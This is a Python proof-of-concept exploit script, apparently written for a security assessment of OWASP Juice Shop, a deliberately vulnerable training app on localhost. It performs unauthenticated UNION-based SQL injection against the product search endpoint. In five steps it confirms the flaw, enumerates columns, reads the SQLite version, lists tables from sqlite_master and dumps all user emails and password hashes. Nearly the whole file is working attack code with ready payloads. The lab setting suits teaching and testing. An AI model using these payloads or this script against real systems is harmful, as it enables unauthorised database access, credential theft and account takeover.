#!/usr/bin/env python3
"""
Finding F-001: SQL Injection in /rest/products/search?q=
Target: OWASP Juice Shop - http://localhost:3000
Severity: CRITICAL
CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE: CWE-89 - Improper Neutralization of Special Elements used in an SQL Command

This PoC demonstrates unauthenticated UNION-based SQL injection that allows
full extraction of all database tables and user credentials.
"""

import urllib.request
import urllib.parse
import json
import sys

BASE_URL = "http://localhost:3000/rest/products/search"


def fetch(payload_raw):
    """Send a GET request with the given raw payload appended to ?q="""
    url = BASE_URL + "?q=" + payload_raw
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        return body
    except Exception as e:
        return str(e)


def check_error_based():
    """Step 1: Trigger a SQLite syntax error to confirm SQLi."""
    print("[*] Step 1: Error-based confirmation (q=' OR 1=1--)")
    payload = "%27%20OR%201%3D1--"
    resp = fetch(payload)
    if "SQLITE_ERROR" in resp:
        print("[+] CONFIRMED: SQLITE_ERROR in response")
        return True
    else:
        print("[-] No error response — trying next technique")
        return False


def check_union_columns():
    """Step 2: Confirm UNION SELECT with 9 columns."""
    print("[*] Step 2: UNION SELECT column enumeration")
    payload = "ZZZNOTFOUND'))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9--"
    resp = fetch(payload)
    try:
        data = json.loads(resp)
        row = data["data"][0]
        if row["id"] == 1 and row["name"] == "2":
            print(f"[+] CONFIRMED: UNION SELECT with 9 columns works")
            print(f"    Injected row: {row}")
            return True
    except Exception:
        pass
    print("[-] UNION SELECT failed")
    return False


def extract_version():
    """Step 3: Extract the SQLite engine version."""
    print("[*] Step 3: Extracting SQLite version")
    payload = "ZZZNOTFOUND'))%20UNION%20SELECT%20sqlite_version(),2,3,4,5,6,7,8,9--"
    resp = fetch(payload)
    try:
        data = json.loads(resp)
        version = data["data"][0]["id"]
        print(f"[+] SQLite version: {version}")
        return version
    except Exception as e:
        print(f"[-] Failed to extract version: {e}")
        return None


def extract_tables():
    """Step 4: Enumerate all database table names via sqlite_master."""
    print("[*] Step 4: Extracting database tables from sqlite_master")
    payload = (
        "ZZZNOTFOUND'))%20UNION%20SELECT%20GROUP_CONCAT(tbl_name)"
        ",2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type%3D'table'--"
    )
    resp = fetch(payload)
    try:
        data = json.loads(resp)
        tables = data["data"][0]["id"].split(",")
        print(f"[+] Found {len(tables)} tables: {', '.join(tables)}")
        return tables
    except Exception as e:
        print(f"[-] Failed to extract tables: {e}")
        return []


def dump_credentials():
    """Step 5: Dump all user emails and password hashes from the Users table."""
    print("[*] Step 5: Dumping Users table (email:password_hash)")
    payload = (
        "ZZZNOTFOUND'))%20UNION%20SELECT%20GROUP_CONCAT(email||':'||password)"
        ",2,3,4,5,6,7,8,9%20FROM%20Users--"
    )
    resp = fetch(payload)
    try:
        data = json.loads(resp)
        creds = data["data"][0]["id"].split(",")
        print(f"[+] CRITICAL: Extracted {len(creds)} user credentials:")
        for cred in creds:
            print(f"    {cred}")
        return creds
    except Exception as e:
        print(f"[-] Failed to dump credentials: {e}")
        return []


def main():
    print("=" * 70)
    print("F-001 SQL Injection PoC - OWASP Juice Shop")
    print(f"Target: {BASE_URL}")
    print("=" * 70)
    print()

    # Run all exploit steps in sequence
    error_confirmed = check_error_based()
    print()

    union_confirmed = check_union_columns()
    if not union_confirmed:
        print("[!] UNION technique failed. Aborting.")
        sys.exit(1)
    print()

    version = extract_version()
    print()

    tables = extract_tables()
    print()

    if "Users" in tables:
        creds = dump_credentials()
    else:
        print("[-] Users table not found in extracted tables")
        creds = []

    print()
    print("=" * 70)
    if creds:
        print(f"RESULT: CRITICAL - Full credential dump achieved ({len(creds)} accounts)")
        print("IMPACT: Unauthenticated attacker can extract all user email/password hashes")
        print("        enabling offline cracking and account takeover.")
    else:
        print("RESULT: SQL injection confirmed but credential dump failed")
    print("=" * 70)


if __name__ == "__main__":
    main()
